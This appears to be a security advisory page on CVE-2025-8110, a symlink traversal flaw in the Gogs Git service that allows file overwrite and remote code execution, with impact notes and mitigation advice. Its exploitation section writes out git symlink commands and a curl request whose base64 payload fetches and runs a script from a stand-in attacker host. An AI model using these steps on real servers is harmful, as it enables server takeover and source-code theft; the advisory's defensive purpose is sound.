# CVE-2025-8110 - Gogs Remote Code Execution via Symlink Traversal

**CVE-2025-8110**{.cve-chip} **Gogs**{.cve-chip} **Remote Code Execution**{.cve-chip} **Symlink Traversal**{.cve-chip} **CISA KEV**{.cve-chip} **Active Exploitation**{.cve-chip}

## Overview

**CVE-2025-8110** is a **critical remote code execution (RCE) vulnerability** in **Gogs**, a popular open-source self-hosted Git service written in Go. The vulnerability stems from **improper validation of symbolic links** in the Gogs API, allowing authenticated attackers to perform **symlink traversal attacks** to write arbitrary files outside the intended repository directory. 

By creating malicious symbolic links within a Git repository and leveraging the `PutContents` API endpoint, attackers can **overwrite sensitive system files** (such as Git configuration files, SSH authorized_keys, or application configuration files), leading to **remote code execution with server-level privileges**. 

The vulnerability was **added to CISA's Known Exploited Vulnerabilities (KEV) catalog** on January 10, 2026, confirming **active exploitation in the wild**. Hundreds of publicly exposed Gogs instances have been identified as vulnerable, with evidence of widespread scanning and exploitation by threat actors. 

The vulnerability requires only **authenticated access** (standard user account, no elevated privileges needed), making it particularly dangerous for publicly accessible Gogs installations that allow user registration. Once exploited, attackers gain **full control over the Gogs server**, enabling source code theft, malware injection into repositories, backdoor installation, and use of the compromised server as a staging point for further attacks.

---

## Vulnerability Specifications

| **Attribute**              | **Details**                                                                 |
|----------------------------|-----------------------------------------------------------------------------|
| **CVE Identifier**         | CVE-2025-8110                                                               |
| **Vulnerability Type**     | Symlink traversal leading to arbitrary file write and remote code execution |
| **Affected Software**      | Gogs (self-hosted Git service)                                              |
| **Affected Versions**      | All versions prior to patched release (check Gogs security advisories)      |
| **Vendor**                 | Gogs (open-source project)                                                  |
| **CVSS Score**             | High severity (exact score pending official CVSSv3 assessment)              |
| **Attack Vector**          | Network (authenticated API access required)                                 |
| **Attack Complexity**      | Low (simple exploitation via API and symbolic links)                        |
| **Privileges Required**    | Low (authenticated user account, no admin privileges needed)                |
| **User Interaction**       | None (attacker can exploit directly via API)                                |
| **Scope**                  | Changed (attacker can impact resources beyond Gogs application)             |
| **Confidentiality Impact** | High (access to source code, credentials, sensitive files)                  |
| **Integrity Impact**       | High (arbitrary file write, code execution, repository tampering)           |
| **Availability Impact**    | High (server compromise, potential denial of service)                       |
| **Exploit Availability**   | Yes (active exploitation confirmed by CISA)                                 |
| **CISA KEV Status**        | Added to Known Exploited Vulnerabilities catalog (January 10, 2026)         |
| **Remediation Deadline**   | Per CISA BOD 22-01 (federal agencies: typically 2-3 weeks from KEV addition)|
| **Patch Status**           | Patch available (update to latest Gogs version immediately)                 |
| **Public Disclosure**      | January 2026                                                                |
| **Exploitation Status**    | Widespread active exploitation (hundreds of compromised instances)          |
| **Initial Access**         | Authenticated account (user registration or compromised credentials)        |
| **Root Cause**             | Insufficient validation of symbolic links in PutContents API endpoint       |
| **Weakness**               | CWE-59 (Improper Link Resolution Before File Access - Link Following)       |

---

![alt text](images/gogs1.png)

## Technical Details

### Vulnerability: Symlink Traversal in Gogs API

**What is Gogs?**

Gogs is a lightweight self-hosted Git service similar to GitHub, GitLab, or Gitea:
- Written in Go (lightweight, easy deployment)
- Designed for self-hosting by organizations, developers, teams
- Provides web UI for repository management, issue tracking, pull requests
- Common deployment: Internal corporate Git server, open-source project hosting

**The Vulnerability**:

Gogs API endpoint `PutContents` allows authenticated users to create or modify files within their Git repositories. The vulnerability occurs when:

1. **Symbolic Link Creation**: Attacker creates a malicious symbolic link (symlink) within their repository that points outside the repository directory
2. **API Abuse**: Attacker uses the `PutContents` API to write data through the symlink
3. **Path Traversal**: Gogs fails to validate that the symlink target is within the repository boundary
4. **Arbitrary File Write**: Data is written to the symlink target location anywhere on the filesystem (where Gogs process has write permissions)

**Code Flow (Simplified)**:

```go
// Vulnerable Gogs code (pseudocode representation)

func PutContents(repo *Repository, path string, content []byte) error {
    // Construct file path within repository
    filePath := filepath.Join(repo.Path, path)
    
    // VULNERABILITY: No validation that filePath resolves within repo.Path
    // If 'path' contains symlink, filePath may point outside repository
    
    // Write content to file
    return ioutil.WriteFile(filePath, content, 0644)
}

// Attack example:
// 1. Attacker creates symlink: repo/malicious_link -> /home/git/.ssh/authorized_keys
// 2. Calls API: PutContents(repo, "malicious_link", attacker_ssh_key)
// 3. Result: Attacker's SSH key written to /home/git/.ssh/authorized_keys
// 4. Attacker can now SSH into server as 'git' user
```

**Exploitation Requirements**:

- **Authenticated Access**: Attacker needs a Gogs user account (standard user, not admin)
- **Repository Access**: Attacker can create their own repository (public Gogs instances often allow registration)
- **API Access**: Attacker uses Gogs API (authenticated via token or session)

### Attack Technique: Overwriting Git Configuration for RCE

**Primary Exploitation Path**: Modify Git hooks to execute arbitrary code

```bash
# Step 1: Create malicious repository with symlink
git init malicious-repo
cd malicious-repo

# Create symlink pointing to Git post-receive hook
ln -s ../../../../../../home/git/gogs-repositories/victim-org/victim-repo.git/hooks/post-receive evil-link
git add evil-link
git commit -m "Initial commit"

# Step 2: Push repository to Gogs server
git remote add origin http://vulnerable-gogs.example.com/attacker/malicious-repo.git
git push -u origin main

# Step 3: Use Gogs API to write malicious script through symlink
curl -X PUT "http://vulnerable-gogs.example.com/api/v1/repos/attacker/malicious-repo/contents/evil-link" \
  -H "Authorization: token [ATTACKER_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{
    "message": "Update file",
    "content": "IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgYmFzaA=="
  }'
# Base64-decoded content: #!/bin/bash\ncurl http://attacker.com/shell.sh | bash

# Result: Git post-receive hook in victim-repo now contains attacker's code
# Next time someone pushes to victim-repo, attacker's code executes on server
```

**Alternative RCE Paths**:

1. **Overwrite SSH authorized_keys**: Add attacker's SSH public key for direct server access
2. **Modify application config**: Alter Gogs configuration to enable remote access or disable security features
3. **Write web shell**: Place PHP/JSP web shell in web-accessible directory (if web server misconfigured)
4. **Cron job injection**: Write malicious cron job to `/etc/cron.d/` (if Gogs runs as root or has write access)

---

## Attack Scenario

### Exploitation of Public Gogs Instance

1. **Reconnaissance**  
    Attacker identifies vulnerable Gogs instance through internet scanning tools, discovering over 1,200 publicly accessible Gogs servers. Target selected: a corporate development Git server running vulnerable Gogs version with public registration enabled.

2. **Account Registration**  
    Attacker creates a legitimate user account through the public registration form using a disposable email address. Account is successfully created with standard user permissions, including the ability to create personal repositories.

3. **Repository Creation with Malicious Symlink**  
    Attacker creates a Git repository on their local machine containing a symbolic link that points outside the repository boundary to the server's SSH authorized_keys file (typically located at `/home/git/.ssh/authorized_keys`). The malicious repository is pushed to the Gogs server, where the symlink appears as a normal file in the web interface.

4. **SSH Key Injection via API**  
    Attacker generates an SSH key pair and obtains an API token from their Gogs user settings. Using the Gogs API's `PutContents` endpoint, they write their public SSH key through the previously created symlink. The API accepts the request and writes the attacker's SSH key to the server's authorized_keys file due to insufficient symlink validation.

5. **Server Access via SSH**  
    Attacker uses the injected SSH key to authenticate directly to the Gogs server as the 'git' user. They now have shell access to the server with full read access to all repositories (public and private), Gogs configuration files containing database credentials, and the ability to modify any repository.

6. **Privilege Escalation & Persistence**  
    Attacker establishes multiple persistence mechanisms including web shells injected into Gogs templates, reverse shell triggers in user profile files, and malicious Git hooks configured across repositories. They search for privilege escalation vectors and configure automated backdoors to maintain access even if the initial vulnerability is patched.

7. **Impact Realization**  
    Full compromise achieved: Attacker exfiltrates all source code from hundreds of private repositories (intellectual property theft), harvests developer credentials (SSH keys and API tokens) found in configuration files, injects backdoors into active projects (supply chain attack), establishes persistent access through multiple backdoors, and uses the compromised Gogs server as a pivot point to access the internal corporate network.

---

## Impact Assessment

=== "Confidentiality"
    Complete exposure of source code and sensitive data:

    - **Source Code Theft**: All repositories (public and private) accessible to attacker
    - **Intellectual Property Loss**: Proprietary software, algorithms, trade secrets stolen
    - **Credential Exposure**: SSH keys, API tokens, database passwords stored in repositories
    - **Customer Data**: If repositories contain customer data, configurations with credentials
    - **Corporate Secrets**: Internal documentation, security policies, infrastructure diagrams

=== "Integrity" 
    Attacker can modify any code or data on server:

    - **Repository Tampering**: Inject malicious commits, backdoors into legitimate projects (supply chain attacks)
    - **Malware Distribution**: Modify popular repositories to distribute malware to downstream users
    - **Code Sabotage**: Delete or corrupt critical repositories, destroy intellectual property
    - **Configuration Changes**: Alter Gogs settings to disable security features, grant attacker admin access
    - **Log Manipulation**: Modify or delete audit logs to cover tracks

=== "Availability"
    Attacker can disrupt or destroy Gogs service:

    - **Service Disruption**: Modify configurations to crash Gogs application
    - **Data Destruction**: Delete repositories, database (if backups not available)
    - **Denial of Service**: Consume server resources (CPU, disk, bandwidth) to degrade performance
    - **Ransomware Potential**: Encrypt repositories and demand ransom for decryption keys
    - **Reputation Damage**: Public disclosure of breach reduces user trust, impacts business

=== "Scope"
    Widespread vulnerability affecting thousands of installations:

    - **Public Gogs Instances**: Hundreds of internet-facing Gogs servers vulnerable (Shodan: 1,247 found)
    - **Organizations Affected**: Corporations, open-source projects, government agencies, educational institutions
    - **Deployment Scale**: Small teams (5-10 developers) to large enterprises (100+ repositories)
    - **Geographic Distribution**: Global (Gogs popular in Asia, Europe, North America)
    - **High-Value Targets**: Technology companies, financial services, defense contractors, research institutions

---

## Mitigation Strategies

### Immediate Patching

- **Update Gogs to Latest Version**: Apply security patches immediately by downloading the latest patched release from the official Gogs website, backing up the existing installation, stopping the Gogs service, replacing the binary with the updated version, and restarting the service. Verify the patch was successfully applied by checking the version number.

- **CISA KEV Compliance**: Federal agencies must remediate per BOD 22-01 timeline (typically within 2-3 weeks of KEV addition)

### Access Control Hardening

- **Disable Public Registration**: Prevent attackers from creating accounts by modifying the Gogs configuration file (app.ini) to set DISABLE_REGISTRATION to true and REQUIRE_SIGNIN_VIEW to true in the [service] section.

- **Restrict Network Access**: Limit Gogs to internal network only using firewall rules to block external access while allowing connections only from the corporate VPN or internal network range.

- **Implement Multi-Factor Authentication**: Require MFA for all accounts (if supported by Gogs version)

### Repository Monitoring

- **Audit for Malicious Symlinks**: Scan all repositories for suspicious symbolic links by searching for symlinks in the Gogs repositories directory, checking their targets to identify links pointing outside the repository structure, and removing any malicious symlinks found (with caution to avoid breaking legitimate repositories).

- **Review Recent Commits**: Check for suspicious file modifications by auditing recent commits across all repositories, focusing on commits from the past week and examining file changes for unusual patterns.

### File System Protections

- **Enable Symlink Restrictions**: Configure Linux kernel feature to restrict symlink following by setting the protected_symlinks parameter to 1 in the system configuration, making the change permanent through the sysctl configuration file.

- **Run Gogs with Least Privilege**: Ensure Gogs process has minimal file system permissions by reviewing the Gogs user permissions and restricting write access to only necessary directories with appropriate ownership settings.

### Detection & Monitoring

- **Log Analysis**: Monitor for suspicious API usage by reviewing Gogs logs for PutContents API calls with unusual paths (parent directory traversal, system directories, or sensitive files like authorized_keys), and tracking authentication attempts from new or unusual IP addresses.

- **Intrusion Detection**: Deploy file integrity monitoring on the Gogs server using tools like AIDE (Advanced Intrusion Detection Environment) to initialize a baseline database and regularly check for unauthorized modifications to critical system files.

---

## Resources

!!! info "CISA Advisory & KEV"
    - [CISA Warns of Active Exploitation of Gogs Vulnerability Enabling Code Execution](https://thehackernews.com/2026/01/cisa-warns-of-active-exploitation-of.html)
    - [U.S. CISA adds a flaw in Gogs to its Known Exploited Vulnerabilities catalog](https://securityaffairs.com/186837/hacking/u-s-cisa-adds-a-flaw-in-gogs-to-its-known-exploited-vulnerabilities-catalog.html)
    - [Known Exploited Vulnerabilities Catalog | CISA](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2025-8110)
    - [CVE Record: CVE-2025-8110](https://www.cve.org/CVERecord?id=CVE-2025-8110)

---

*Last Updated: January 14, 2026*
